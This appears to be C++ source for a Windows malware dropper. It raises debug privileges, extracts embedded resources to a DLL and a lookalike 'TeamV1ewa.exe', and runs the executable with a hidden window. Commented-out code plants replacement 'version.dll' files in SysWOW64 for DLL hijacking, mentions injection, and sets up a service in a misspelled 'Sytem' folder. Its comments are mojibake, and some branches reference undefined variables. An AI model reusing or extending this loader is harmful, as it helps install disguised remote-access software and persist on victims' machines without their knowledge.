#include <Windows.h>
#include <stdio.h>
#include <string>
#include "resource.h"
#include <string>
#include <UserEnv.h>
#include <WtsApi32.h>
#pragma comment(lib, "UserEnv.lib")
#pragma comment(lib, "WtsApi32.lib")

#include "../../publicstruct.h"
#include "../../ClassManger/CNativeApi/CNativeApiManger.h"
#include "../../ProcessManger/ProcessIterator/CProcessOpt.h"

using namespace std;
#ifdef  UNICODE
#define  STRING wstring
#else
#define  STRING string;
#endif //  UNICODE


#ifdef _WIN64
#pragma comment(lib,"../../PulicLib/x64/Release/CNativeApi.lib")
#pragma comment(lib,"../../PulicLib/x64/Release/ProcessIterator.lib")
#pragma comment(lib,"../../PulicLib/x64/Release/RegManger.lib")
#pragma comment(lib,"../../PulicLib/x64/Release/CFileManger.lib")
#pragma comment(lib,"../../PulicLib/x64/Release/RemoteThread.lib")
#else
#pragma comment(lib,"../../PulicLib/Win32/Release/CNativeApi.lib")
#pragma comment(lib,"../../PulicLib/Win32/Release/ProcessIterator.lib")
#pragma comment(lib,"../../PulicLib/Win32/Release/RegManger.lib")
#pragma comment(lib,"../../PulicLib/Win32/Release/CFileManger.lib")
#pragma comment(lib,"../../PulicLib/Win32/Release/RemoteThread.lib")
#endif

BOOL WriteFile64AnCreateProcess(DWORD Type, STRING StartUpFileName);
BOOL WriteFile86AnCreateProcess(DWORD Type, STRING StartUpFileName);


BOOL ReleaseFile(DWORD Type);
DWORD getSystemName();  //��ȡϵͳ�汾 ���� 10 ��win10 ����61 ��win7

DWORD getSystemName()
{
    std::string vname;
    //���ж��Ƿ�Ϊwin8.1��win10
    typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
    HINSTANCE hinst = LoadLibrary(TEXT("ntdll.dll"));
    DWORD dwMajor, dwMinor, dwBuildNumber;
    NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
    proc(&dwMajor, &dwMinor, &dwBuildNumber);
    if (dwMajor == 6 && dwMinor == 3)	//win 8.1
    {
        vname = "Microsoft Windows 8.1";
        return 81;

    }
    if (dwMajor == 10 && dwMinor == 0)	//win 10
    {
        vname = "Microsoft Windows 10";

        return 10;
    }
    //�����жϲ���Win Server����Ϊ���˻�δ������ϵͳ�Ļ��ӣ���ʱ������



    //�ж�win8.1���µİ汾
    SYSTEM_INFO info;                //��SYSTEM_INFO�ṹ�ж�64λAMD������  
    GetSystemInfo(&info);            //����GetSystemInfo�������ṹ  
    OSVERSIONINFOEX os;
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
#pragma warning(disable:4996)
    if (GetVersionEx((OSVERSIONINFO *)&os))
    {

        //������ݰ汾��Ϣ�жϲ���ϵͳ����  
        switch (os.dwMajorVersion)
        {                        //�ж����汾��  
        case 4:
            switch (os.dwMinorVersion)
            {                //�жϴΰ汾��  
            case 0:
                if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
                {
                    //vname = "Microsoft Windows NT 4.0";  //1996��7�·���  
                    return 40;
                }
                else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
                {

                    vname = "Microsoft Windows 95";
                    return 401;
                }
                return 0;
            case 10:
                vname = "Microsoft Windows 98";
                return 410;
            case 90:
                vname = "Microsoft Windows Me";
                return 490;

            }
            return 0;
        case 5:
            switch (os.dwMinorVersion)
            {               //�ٱȽ�dwMinorVersion��ֵ  
            case 0:
                vname = "Microsoft Windows 2000";    //1999��12�·���  

                return 50;
            case 1:
                vname = "Microsoft Windows XP";      //2001��8�·���  
                return 51;

            case 2:
                if (os.wProductType == VER_NT_WORKSTATION &&
                    info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                {
                    vname = "Microsoft Windows XP Professional x64 Edition";
                    return 52;
                }
                else if (GetSystemMetrics(SM_SERVERR2) == 0)
                {
                    vname = "Microsoft Windows Server 2003";   //2003��3�·���  
                    return 521;
                }
                else if (GetSystemMetrics(SM_SERVERR2) != 0)
                {
                    vname = "Microsoft Windows Server 2003 R2";
                    return 522;
                }
                return 0;
            }
            return 0;
        case 6:
            switch (os.dwMinorVersion)
            {
            case 0:
                if (os.wProductType == VER_NT_WORKSTATION)
                {
                    vname = "Microsoft Windows Vista";
                    return 60;
                }
                else
                {
                    vname = "Microsoft Windows Server 2008";   //�������汾  
                    return 62008;
                }
                return 0;
            case 1:
                if (os.wProductType == VER_NT_WORKSTATION)
                {
                    vname = "Microsoft Windows 7";
                    return 61;
                }
                else
                {
                    vname = "Microsoft Windows Server 2008 R2";
                    return 612;
                }
                break;
            case 2:
                if (os.wProductType == VER_NT_WORKSTATION)
                {
                    vname = "Microsoft Windows 8";
                    return 62;
                }
                else
                {
                    vname = "Microsoft Windows Server 2012";
                    return 62012;
                }
                return 0;
            }
            return 0;
        default:
        {
            vname = "δ֪����ϵͳ";
            return 0;
        }
        }
        //printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
        return 0;
    }
    else

        return  0;
}

BOOL NoSeccionCreateProcess(CBinString lpszFileName)
{
    BOOL bRet = TRUE;
    DWORD dwSessionID = 0;
    HANDLE hToken = NULL;
    HANDLE hDuplicatedToken = NULL;
    LPVOID lpEnvironment = NULL;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    HANDLE ProcessHandle;
    HANDLE CurrentToken;

    ProcessHandle = GetCurrentProcess();
    if (!OpenProcessToken(ProcessHandle, TOKEN_ALL_ACCESS, &CurrentToken))
    {
        int d = GetLastError();
        OutputDebugStringA("OpenProcessToken ERROR");

        return 0;
    }

    do
    {
        // ��õ�ǰSession ID
        dwSessionID = ::WTSGetActiveConsoleSessionId();

        // ��õ�ǰSession���û�����
    /*    if (FALSE == ::WTSQueryUserToken(dwSessionID, &hToken))
        {
            OutputDebugStringA("WTSQueryUserToken ERROR");
            bRet = FALSE;
            break;
        }*/

        // ��������
        hToken = CurrentToken;
        if (FALSE == ::DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
            SecurityIdentification, TokenPrimary, &hDuplicatedToken))
        {
            OutputDebugStringA("DuplicateTokenEx ERROR");

         
            bRet = FALSE;
            break;
        }

        // �����û�Session����
        if (FALSE == ::CreateEnvironmentBlock(&lpEnvironment,
            hDuplicatedToken, FALSE))
        {
            OutputDebugStringA("CreateEnvironmentBlock ERROR");

            bRet = FALSE;
            break;
        }

        // �ڸ��Ƶ��û�Session��ִ��Ӧ�ó��򣬴�������
        if (FALSE == ::CreateProcessAsUser(hDuplicatedToken,
            lpszFileName.c_str(), NULL, NULL, NULL, FALSE,
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
            lpEnvironment, NULL, &si, &pi))
        {
            OutputDebugStringA("CreateProcessAsUser ERROR");

            bRet = FALSE;
            break;
        }

    } while (FALSE);
    // �رվ��, �ͷ���Դ
    if (lpEnvironment)
    {
        ::DestroyEnvironmentBlock(lpEnvironment);
    }
    if (hDuplicatedToken)
    {
        ::CloseHandle(hDuplicatedToken);
    }
    if (hToken)
    {
        ::CloseHandle(hToken);
    }
    return bRet;
}

BOOL WriteFile64AnCreateProcess(DWORD Type)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

    TCHAR SaveTempPath[MAX_PATH * sizeof(TCHAR)] = { NULL };
    GetSystemWindowsDirectory(SaveTempPath, MAX_PATH);

#ifdef UNICODE
    wstring TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat64"));
    FILE* pFile = NULL;
    _wfopen_s(&pFile, TempFileName.c_str(), TEXT("wb+"));
    //д�뵽�ļ�
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//д�뵽�ļ�

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat64"));
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //д�뵽�ļ�
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//д�뵽�ļ�

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(TempFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
BOOL WriteFile86AnCreateProcess(DWORD Type,STRING StartUpFileName)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

#ifdef UNICODE
    
    FILE* pFile = NULL;
    _wfopen_s(&pFile, StartUpFileName.c_str(), TEXT("wb+"));
    //д�뵽�ļ�
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//д�뵽�ļ�

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat86"));
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //д�뵽�ļ�
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//д�뵽�ļ�

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(StartUpFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);


   
    
    return TRUE;
}

BOOL ReleaseFile(DWORD Type,STRING fileName)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

#ifdef UNICODE

 // UNICODE

    FILE* pFile = NULL;
    _wfopen_s(&pFile, fileName.c_str(), TEXT("wb+"));
    //д�뵽�ļ�
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//д�뵽�ļ�

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(fileName);
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //д�뵽�ļ�
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//д�뵽�ļ�

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE
    return TRUE;
}
STRING GetPath()
{
    TCHAR SaveTempPath[MAX_PATH * sizeof(TCHAR)] = { NULL };
    GetSystemWindowsDirectory(SaveTempPath, MAX_PATH);
    STRING FileName = SaveTempPath;
    
#ifdef UNICODE
    FileName.append(TEXT("\\"));
    FileName.append(TEXT("Sytem"));
    wstring TempFileName = TEXT("");
    if (NULL != CreateDirectory(FileName.c_str(), NULL))
    {
        TempFileName = FileName;
        TempFileName.append(TEXT("\\"));
        return STRING(TempFileName);
    }
    DWORD dwError = GetLastError();
    if (dwError == ERROR_ALREADY_EXISTS)
    {
         TempFileName = FileName;
        TempFileName.append(TEXT("\\"));
        return STRING(TempFileName);
    }
    return NULL;
    
#else
    FileName.append("\\");
    FileName.append("Sytem");
    string TempFileName = "";
    if (NULL != CreateDirectory(FileName.c_str(), NULL))
    {
        TempFileName = FileName;
        TempFileName.append("\\");
        return STRING(TempFileName);
    }
    DWORD dwError = GetLastError();
    if (dwError == ERROR_ALREADY_EXISTS)
    {
        TempFileName = FileName;
        TempFileName.append("\\");
        return STRING(TempFileName);
    }
    return NULL;
#endif
    
}

int main()
{
    CProcessOpt PsOpt;
    PsOpt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);

    DWORD dwWinver = getSystemName(); //�ж�ϵͳ�汾
 
    CBinString patchName = TEXT("");
    TCHAR szCurrentPath[0X256] = { 0 };
    GetCurrentDirectory(sizeof(TCHAR) * 1024,szCurrentPath);
    patchName = szCurrentPath;
    patchName.append(TEXT("\\"));
    patchName.append(TEXT("Tv_x86.dll"));//����DLL
   // WriteFile86AnCreateProcess(CHANGE_FILESECURRTY_WIN7, patchName);
    ReleaseFile(Tv_x86_Dll, patchName);
    Sleep(200);
    ////WriteFile86AnCreateProcess(INJECT_KILL_IELOCKLOADER, patchName); //дע����
    //if (dwWinver == 61)
    //{
    //    //win7
    //    patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
    //    ReleaseFile(VERSION_WIN7_SP1, patchName);
    //    Sleep(300);
    //    return 0;
    //}
    //else if (dwWinver == 10)
    //{
    //    patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
    //    ReleaseFile(VERSION_WIN10, patchName);
    //    Sleep(300);
    //    return 0;
    //}
   
    //д��ȫ��ע��
    patchName = TEXT("");
    memset(szCurrentPath, 0, sizeof(TCHAR) * 0X256);
    GetCurrentDirectory(sizeof(TCHAR) * 1024, szCurrentPath);
    patchName = szCurrentPath;
    patchName.append(TEXT("\\"));
    patchName.append(TEXT("TeamV1ewa.exe"));//д��EXE
    //WriteFile86AnCreateProcess(TeamView_EXE, patchName);
    ReleaseFile(TeamView_EXE, patchName);//��������.
   
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(patchName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    Sleep(1000);
    return 0;
   // NoSeccionCreateProcess(patchName);
 
    //д��SystemService

    //д��CreateService
    //patchName = GetPath();
    //patchName.append(TEXT("SystemServices.exe"));
    //ReleaseFile(SystemServices, patchName); //SystemService
    //Sleep(1000);//�h���ļ�.

    //patchName = GetPath();
    //patchName.append(TEXT("start"));
    //WriteFile86AnCreateProcess(CreateAnStartServices, patchName); //дע����
    ////д����񴴽���������

  
    
    DeleteFile(patchName.c_str());

    return 0;
}